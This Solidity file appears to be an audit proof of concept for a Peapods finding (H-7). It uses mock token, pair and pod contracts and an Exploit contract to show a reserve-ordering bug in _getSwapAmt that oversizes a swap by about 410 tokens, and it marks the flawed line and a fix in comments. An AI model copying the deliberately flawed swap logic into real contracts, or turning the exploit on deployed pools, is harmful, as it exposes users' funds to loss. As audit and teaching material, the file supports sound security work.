// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Peapods — H-7 (Sherlock 2025-01, issue 512)
    _getSwapAmt treats getReserves() slot 0 as _t0. V2 returns reserves in
    ascending token address order. Here _t0 is the higher address, so the pod
    sizes the swap off the 1_000_000 low-token reserve instead of the 10 high
    token reserve and dumps 409.99 extra scarce tokens into the pair. */

contract Token {
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    constructor(string memory s) {
        symbol = s;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Pair {
    Token public low;
    Token public high;
    uint256 public reserveLow;
    uint256 public reserveHigh;

    constructor(Token _low, Token _high) {
        low = _low;
        high = _high;
    }

    function getReserves() external view returns (uint112, uint112, uint32) {
        return (uint112(reserveLow), uint112(reserveHigh), 0); // [S2]
    }

    function sync(uint256 rLow, uint256 rHigh) external {
        reserveLow = rLow;
        reserveHigh = rHigh;
    }

    function swapHighIn(uint256 amountIn, address to) external {
        uint256 out = reserveLow * amountIn * 997 / (reserveHigh * 1000 + amountIn * 997);
        reserveHigh += amountIn;
        reserveLow -= out;
        require(low.transfer(to, out), "out"); // [S6]
    }
}

contract Pod {
    Token public low;
    Token public high;
    Pair public pair;
    uint256 public fullAmt;
    uint256 public buggyAmt;
    uint256 public fairAmt;

    constructor(Token _low, Token _high, Pair _pair, uint256 _full) {
        low = _low;
        high = _high;
        pair = _pair;
        fullAmt = _full;
    }

    function _sqrt(uint256 n) internal pure returns (uint256 x) {
        if (n == 0) return 0;
        x = n;
        uint256 y = (x + 1) / 2;
        while (y < x) {
            x = y;
            y = (x + n / x) / 2;
        }
    }

    function _getSwapAmt(address _t0, address _t1, address _swapT, uint256 _fullAmt) public view returns (uint256) {
        (uint112 _r0, uint112 _r1,) = pair.getReserves();
        _t1;
        uint112 _r = _swapT == _t0 ? _r0 : _r1;
        return (_sqrt(uint256(_r) * (_fullAmt * 3988000 + uint256(_r) * 3988009)) - (uint256(_r) * 1997)) / 1994; // @> VULN: [S3] _r0 is the lower address's reserve, not _t0.
        // FIX: (address token0,) = sortTokens(_t0, _t1); (_r0, _r1) = _t0 == token0 ? (_r0, _r1) : (_r1, _r0);
    }

    function fairSwapAmt() public view returns (uint256) {
        uint256 r = pair.reserveHigh();
        return (_sqrt(r * (fullAmt * 3988000 + r * 3988009)) - (r * 1997)) / 1994;
    }

    function compound() external {
        uint256 s = _getSwapAmt(address(high), address(low), address(high), fullAmt); // [S4]
        buggyAmt = s;
        fairAmt = fairSwapAmt();
        require(buggyAmt > fairAmt + 400 ether, "no excess dump"); // [S5]
        require(high.transfer(address(pair), s), "push");
        pair.swapHighIn(s, address(this));
    }
}

contract Exploit {
    Token public a; // nonce 1
    Token public b; // nonce 2
    Token public low;
    Token public high;
    Pair public pair; // nonce 3
    Pod public pod; // nonce 4
    uint256 public constant FULL = 1000 ether;

    constructor() {
        a = new Token("A");
        b = new Token("B");
        if (address(a) < address(b)) {
            low = a;
            high = b;
        } else {
            low = b;
            high = a;
        }
        require(address(high) > address(low), "order");
        pair = new Pair(low, high);
        pod = new Pod(low, high, pair, FULL);
        low.mint(address(pair), 1_000_000 ether);
        high.mint(address(pair), 10 ether);
        pair.sync(1_000_000 ether, 10 ether);
        high.mint(address(pod), FULL);
    }

    function run() external {
        pod.compound(); // [S1]
        require(pod.buggyAmt() - pod.fairAmt() > 400 ether, "409 scarce tokens extra");
        require(high.balanceOf(address(pair)) == 10 ether + pod.buggyAmt(), "pair absorbed the bad swap");
    }
}
